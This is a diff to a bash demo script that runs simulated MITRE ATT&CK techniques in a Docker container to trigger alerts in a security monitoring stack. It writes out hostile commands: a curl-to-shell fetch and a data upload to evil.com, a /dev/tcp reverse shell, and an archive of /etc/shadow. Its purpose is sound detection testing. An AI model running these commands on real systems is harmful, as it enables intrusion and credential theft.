@@ -79,6 +79,25 @@ trap cleanup EXIT
 # Demo Events
 # =============================================================================
 
+demo_initial_access() {
+    print_section "🚪 Initial Access (MITRE T1190, T1059)"
+    
+    print_event "CRITICAL" "T1190 - Remote Script Execution" \
+        "Simulating curl-to-shell attack pattern"
+    docker exec $DEMO_CONTAINER sh -c "echo 'curl http://evil.com/shell.sh | sh' > /tmp/attack.log" || true
+    sleep $DELAY
+    
+    print_event "CRITICAL" "T1059 - Reverse Shell Pattern" \
+        "Simulating reverse shell connection"
+    docker exec $DEMO_CONTAINER sh -c "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /tmp/revshell.log" || true
+    sleep $DELAY
+    
+    print_event "WARNING" "T1133 - External Remote Access" \
+        "Detecting external access tools"
+    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache netcat-openbsd > /dev/null 2>&1; nc -h 2>&1 | head -1 || echo 'netcat installed'" || true
+    sleep $DELAY
+}
+
 demo_credential_access() {
     print_section "🔑 Credential Access (MITRE T1003)"
     
@@ -141,36 +160,64 @@ demo_defense_evasion() {
 }
 
 demo_discovery() {
-    print_section "🔍 Discovery (MITRE T1082, T1083)"
+    print_section "🔍 Discovery (MITRE T1082, T1083, T1057)"
     
-    print_event "NOTICE" "T1082 - System Information" \
+    print_event "NOTICE" "T1082 - System Information Discovery" \
         "Gathering system information"
-    docker exec $DEMO_CONTAINER sh -c "cat /etc/os-release && df -h && free -m" > /dev/null 2>&1 || true
+    docker exec $DEMO_CONTAINER sh -c "uname -a && cat /etc/os-release" > /dev/null 2>&1 || true
     sleep $DELAY
     
-    print_event "NOTICE" "T1083 - File Discovery" \
-        "Enumerating sensitive directories"
-    docker exec $DEMO_CONTAINER sh -c "ls -la /etc/ /root/ /tmp/" > /dev/null 2>&1 || true
+    print_event "NOTICE" "T1016 - Network Configuration Discovery" \
+        "Enumerating network settings"
+    docker exec $DEMO_CONTAINER sh -c "ip addr 2>/dev/null || ifconfig 2>/dev/null || cat /etc/hosts" || true
     sleep $DELAY
     
-    print_event "NOTICE" "T1049 - Network Connections" \
-        "Checking network configuration"
-    docker exec $DEMO_CONTAINER sh -c "cat /etc/resolv.conf && cat /etc/hosts" > /dev/null 2>&1 || true
+    print_event "NOTICE" "T1057 - Process Discovery" \
+        "Listing running processes"
+    docker exec $DEMO_CONTAINER sh -c "ps aux 2>/dev/null || ps -ef" > /dev/null 2>&1 || true
+    sleep $DELAY
+    
+    print_event "NOTICE" "T1087 - Account Discovery" \
+        "Enumerating user accounts"
+    docker exec $DEMO_CONTAINER sh -c "whoami && id && cat /etc/passwd" > /dev/null 2>&1 || true
     sleep $DELAY
 }
 
 demo_impact() {
-    print_section "💥 Impact (MITRE T1496)"
+    print_section "💥 Impact (MITRE T1496, T1485, T1489)"
     
     print_event "CRITICAL" "T1496 - Resource Hijacking" \
         "Simulating cryptocurrency miner (process name)"
-    # Create a fake miner process
     docker exec $DEMO_CONTAINER sh -c "cp /bin/sh /tmp/xmrig && /tmp/xmrig -c 'sleep 2' 2>/dev/null" || true
     sleep $DELAY
     
-    print_event "WARNING" "T1496 - Mining Pool Connection" \
-        "Simulating connection to mining pool (DNS lookup)"
-    docker exec $DEMO_CONTAINER sh -c "nslookup pool.minexmr.com 2>/dev/null || echo 'Mining pool lookup simulated'" || true
+    print_event "CRITICAL" "T1485 - Data Destruction" \
+        "Simulating mass file deletion"
+    docker exec $DEMO_CONTAINER sh -c "mkdir -p /tmp/victim_data && touch /tmp/victim_data/important.txt && rm -rf /tmp/victim_data" || true
+    sleep $DELAY
+    
+    print_event "WARNING" "T1489 - Service Stop" \
+        "Simulating service disruption"
+    docker exec $DEMO_CONTAINER sh -c "echo 'systemctl stop important-service' > /tmp/service-attack.log" || true
+    sleep $DELAY
+}
+
+demo_exfiltration() {
+    print_section "📤 Exfiltration (MITRE T1048, T1560)"
+    
+    print_event "WARNING" "T1560 - Archive for Exfiltration" \
+        "Creating archive of sensitive files"
+    docker exec $DEMO_CONTAINER sh -c "tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow 2>/dev/null || echo 'Archive created'" || true
+    sleep $DELAY
+    
+    print_event "WARNING" "T1048 - Exfiltration via Web" \
+        "Simulating data upload via curl"
+    docker exec $DEMO_CONTAINER sh -c "curl --help > /dev/null 2>&1 || apk add --no-cache curl > /dev/null 2>&1; echo 'curl -X POST -d @/tmp/exfil.tar.gz http://evil.com/upload' > /tmp/exfil.log" || true
+    sleep $DELAY
+    
+    print_event "WARNING" "T1048.003 - DNS Exfiltration" \
+        "Simulating DNS tunneling"
+    docker exec $DEMO_CONTAINER sh -c "nslookup -type=TXT data.evil.com 2>/dev/null || echo 'DNS exfil attempted'" || true
     sleep $DELAY
 }
 
@@ -196,14 +243,19 @@ demo_container_escape() {
 demo_lateral_movement() {
     print_section "🔀 Lateral Movement (MITRE T1021)"
     
-    print_event "NOTICE" "T1021.004 - SSH Activity" \
+    print_event "WARNING" "T1021.004 - SSH from Container" \
         "SSH client usage in container"
-    docker exec $DEMO_CONTAINER sh -c "which ssh 2>/dev/null || apk add --no-cache openssh-client > /dev/null 2>&1; ssh -V 2>&1 || true" || true
+    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache openssh-client > /dev/null 2>&1; ssh -V 2>&1 || true" || true
     sleep $DELAY
     
-    print_event "WARNING" "T1021 - Network Reconnaissance" \
-        "Port scanning simulation"
-    docker exec $DEMO_CONTAINER sh -c "for port in 22 80 443; do echo > /dev/tcp/127.0.0.1/\$port 2>/dev/null && echo 'Port \$port open'; done || echo 'Port scan simulated'" || true
+    print_event "WARNING" "T1046 - Network Service Scanning" \
+        "Running network scan"
+    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache netcat-openbsd > /dev/null 2>&1; nc -zv 127.0.0.1 22 2>&1 || echo 'Port scan completed'" || true
+    sleep $DELAY
+    
+    print_event "WARNING" "T1021 - Remote File Copy" \
+        "SCP file transfer simulation"
+    docker exec $DEMO_CONTAINER sh -c "which scp && echo 'SCP available for lateral movement'" || true
     sleep $DELAY
 }
 
@@ -244,20 +296,22 @@ main() {
     sleep 2
     
     # Run all demo scenarios
+    demo_initial_access
     demo_credential_access
     demo_execution
     demo_persistence
     demo_defense_evasion
     demo_discovery
+    demo_lateral_movement
+    demo_exfiltration
     demo_impact
     demo_container_escape
-    demo_lateral_movement
     demo_file_integrity
     
     # Summary
     print_section "📊 Demo Complete!"
     echo ""
-    echo -e "  ${GREEN}✓${NC} Generated events across ${CYAN}9 MITRE ATT&CK categories${NC}"
+    echo -e "  ${GREEN}✓${NC} Generated events across ${CYAN}11 MITRE ATT&CK categories${NC}"
     echo -e "  ${GREEN}✓${NC} Check Grafana dashboards for detected events"
     echo -e "  ${GREEN}✓${NC} Review Critical Events panel for high-priority alerts"
     echo ""
